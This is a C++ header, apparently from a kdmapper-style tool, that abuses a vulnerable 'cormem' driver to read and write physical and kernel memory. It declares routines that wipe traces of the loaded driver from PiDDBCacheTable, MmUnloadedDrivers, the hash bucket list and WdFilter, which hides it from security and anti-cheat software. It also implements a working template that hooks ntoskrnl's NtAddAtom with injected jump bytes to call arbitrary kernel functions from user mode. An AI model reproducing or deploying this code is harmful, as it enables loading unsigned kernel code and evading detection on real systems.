#pragma once
#include <Windows.h>
#include <iostream>
#include <string>
#include <memory>
#include <stdint.h>

#include "cormem_driver_resource.hpp"
#include "service.hpp"
#include "utils.hpp"

namespace cormem_driver
{
	extern char driver_name[100];
	extern ULONG64 ntoskrnlAddr;

	// Cormem IOCTL codes
	constexpr DWORD IOCTL_CORMEM_MAP_POOL = 0x222000;
	constexpr DWORD IOCTL_CORMEM_MAP_BUFFER = 0x22200C;
	constexpr DWORD IOCTL_CORMEM_UNMAP_BUFFER = 0x222010;
	constexpr DWORD IOCTL_CORMEM_LINEAR_TO_PHYS = 0x22201C;
	constexpr DWORD IOCTL_CORMEM_GET_POOL_BLOCK_COUNT = 0x22205C;

	constexpr DWORD cormem_timestamp = 0x00000000; // Placeholder timestamp

#pragma pack(push, 1)
	typedef struct _CORMEM_MAP_POOL_OUT {
		uint64_t UserAddress;
		uint64_t KernelAddress;
		uint64_t PhysicalAddress;
		uint32_t Size;
	} CORMEM_MAP_POOL_OUT, * PCORMEM_MAP_POOL_OUT;

	typedef struct _CORMEM_MAP_BUFFER_IN {
		uint64_t Address;
		uint64_t Size;
		uint64_t Param2;
	} CORMEM_MAP_BUFFER_IN, * PCORMEM_MAP_BUFFER_IN;

	typedef struct _PoolBlock {
		uint64_t UserAddress;
		uint64_t KernelAddress;
		uint64_t PhysicalAddress;
		uint64_t Size;
	} PoolBlock;
#pragma pack(pop)

	constexpr uint32_t CORMEM_MAX_POOL_BLOCKS = 0x101;

	typedef struct _RTL_BALANCED_LINKS {
		struct _RTL_BALANCED_LINKS* Parent;
		struct _RTL_BALANCED_LINKS* LeftChild;
		struct _RTL_BALANCED_LINKS* RightChild;
		CHAR Balance;
		UCHAR Reserved[3];
	} RTL_BALANCED_LINKS;
	typedef RTL_BALANCED_LINKS* PRTL_BALANCED_LINKS;

	typedef struct _RTL_AVL_TABLE {
		RTL_BALANCED_LINKS BalancedRoot;
		PVOID OrderedPointer;
		ULONG WhichOrderedElement;
		ULONG NumberGenericTableElements;
		ULONG DepthOfTree;
		PVOID RestartKey;
		ULONG DeleteCount;
		PVOID CompareRoutine;
		PVOID AllocateRoutine;
		PVOID FreeRoutine;
		PVOID TableContext;
	} RTL_AVL_TABLE;
	typedef RTL_AVL_TABLE* PRTL_AVL_TABLE;

	typedef struct _PiDDBCacheEntry
	{
		LIST_ENTRY		List;
		UNICODE_STRING	DriverName;
		ULONG			TimeDateStamp;
		NTSTATUS		LoadStatus;
		char			_0x0028[16];
	} PiDDBCacheEntry, * NPiDDBCacheEntry;

	typedef struct _HashBucketEntry
	{
		struct _HashBucketEntry* Next;
		UNICODE_STRING DriverName;
		ULONG CertHash[5];
	} HashBucketEntry, * PHashBucketEntry;

	bool ClearPiDDBCacheTable(HANDLE device_handle);
	bool ExAcquireResourceExclusiveLite(HANDLE device_handle, PVOID Resource, BOOLEAN wait);
	bool ExReleaseResourceLite(HANDLE device_handle, PVOID Resource);
	BOOLEAN RtlDeleteElementGenericTableAvl(HANDLE device_handle, PVOID Table, PVOID Buffer);
	PVOID RtlLookupElementGenericTableAvl(HANDLE device_handle, PRTL_AVL_TABLE Table, PVOID Buffer);
	PiDDBCacheEntry* LookupEntry(HANDLE device_handle, PRTL_AVL_TABLE PiDDBCacheTable, ULONG timestamp, const wchar_t* name);
	PVOID ResolveRelativeAddress(HANDLE device_handle, _In_ PVOID Instruction, _In_ ULONG OffsetOffset, _In_ ULONG InstructionSize);
	bool AcquireDebugPrivilege();

	uintptr_t FindPatternAtKernel(HANDLE device_handle, uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, const char* szMask);
	uintptr_t FindSectionAtKernel(HANDLE device_handle, const char* sectionName, uintptr_t modulePtr, PULONG size);
	uintptr_t FindPatternInSectionAtKernel(HANDLE device_handle, const char* sectionName, uintptr_t modulePtr, BYTE* bMask, const char* szMask);

	bool ClearKernelHashBucketList(HANDLE device_handle);
	bool ClearWdFilterDriverList(HANDLE device_handle);

	bool IsRunning();
	HANDLE Load();
	bool Unload(HANDLE device_handle);

	// Physical memory translation
	uint64_t TranslateLinearToPhysical(HANDLE device_handle, uint64_t virtual_address);
	uint64_t MapPhysicalMemory(HANDLE device_handle, uint64_t physical_address, uint64_t size);
	bool UnmapPhysicalMemory(HANDLE device_handle, uint64_t mapped_address);

	bool ReadMemory(HANDLE device_handle, uint64_t address, void* buffer, uint64_t size);
	bool WriteMemory(HANDLE device_handle, uint64_t address, void* buffer, uint64_t size);
	bool WriteToReadOnlyMemory(HANDLE device_handle, uint64_t address, void* buffer, uint32_t size);

	uint64_t MmAllocateIndependentPagesEx(HANDLE device_handle, uint32_t size);
	bool MmFreeIndependentPages(HANDLE device_handle, uint64_t address, uint32_t size);
	BOOLEAN MmSetPageProtection(HANDLE device_handle, uint64_t address, uint32_t size, ULONG new_protect);

	uint64_t AllocatePool(HANDLE device_handle, nt::POOL_TYPE pool_type, uint64_t size);
	bool FreePool(HANDLE device_handle, uint64_t address);
	uint64_t GetKernelModuleExport(HANDLE device_handle, uint64_t kernel_module_base, const std::string& function_name);
	bool ClearMmUnloadedDrivers(HANDLE device_handle);
	std::wstring GetDriverNameW();
	std::wstring GetDriverPath();

	template<typename T, typename ...A>
	bool CallKernelFunction(HANDLE device_handle, T* out_result, uint64_t kernel_function_address, const A ...arguments) {
		constexpr auto call_void = std::is_same_v<T, void>;

		static_assert(sizeof...(A) <= 4, "CallKernelFunction: Too many arguments, CallKernelFunction only can be called with 4 or less arguments");

		if constexpr (!call_void) {
			if (!out_result)
				return false;
		}
		else {
			UNREFERENCED_PARAMETER(out_result);
		}

		if (!kernel_function_address)
			return false;

		HMODULE ntdll = GetModuleHandleA("ntdll.dll");
		if (ntdll == 0) {
			Log(L"[-] Failed to load ntdll.dll" << std::endl);
			return false;
		}

		const auto NtAddAtom = reinterpret_cast<void*>(GetProcAddress(ntdll, "NtAddAtom"));
		if (!NtAddAtom)
		{
			Log(L"[-] Failed to get export ntdll.NtAddAtom" << std::endl);
			return false;
		}

		uint8_t kernel_injected_jmp[] = { 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0 };
		uint8_t original_kernel_function[sizeof(kernel_injected_jmp)];
		*(uint64_t*)&kernel_injected_jmp[2] = kernel_function_address;

		static uint64_t kernel_NtAddAtom = GetKernelModuleExport(device_handle, cormem_driver::ntoskrnlAddr, "NtAddAtom");
		if (!kernel_NtAddAtom) {
			Log(L"[-] Failed to get export ntoskrnl.NtAddAtom" << std::endl);
			return false;
		}

		if (!ReadMemory(device_handle, kernel_NtAddAtom, &original_kernel_function, sizeof(kernel_injected_jmp)))
			return false;

		if (original_kernel_function[0] == kernel_injected_jmp[0] &&
			original_kernel_function[1] == kernel_injected_jmp[1] &&
			original_kernel_function[sizeof(kernel_injected_jmp) - 2] == kernel_injected_jmp[sizeof(kernel_injected_jmp) - 2] &&
			original_kernel_function[sizeof(kernel_injected_jmp) - 1] == kernel_injected_jmp[sizeof(kernel_injected_jmp) - 1]) {
			Log(L"[-] FAILED!: The code was already hooked!! is there another instance of the mapper running?" << std::endl);
			return false;
		}

		if (!WriteToReadOnlyMemory(device_handle, kernel_NtAddAtom, &kernel_injected_jmp, sizeof(kernel_injected_jmp)))
			return false;

		if constexpr (!call_void) {
			using FunctionFn = T(__stdcall*)(A...);
			const auto Function = reinterpret_cast<FunctionFn>(NtAddAtom);

			*out_result = Function(arguments...);
		}
		else {
			using FunctionFn = void(__stdcall*)(A...);
			const auto Function = reinterpret_cast<FunctionFn>(NtAddAtom);

			Function(arguments...);
		}

		return WriteToReadOnlyMemory(device_handle, kernel_NtAddAtom, original_kernel_function, sizeof(kernel_injected_jmp));
	}
}
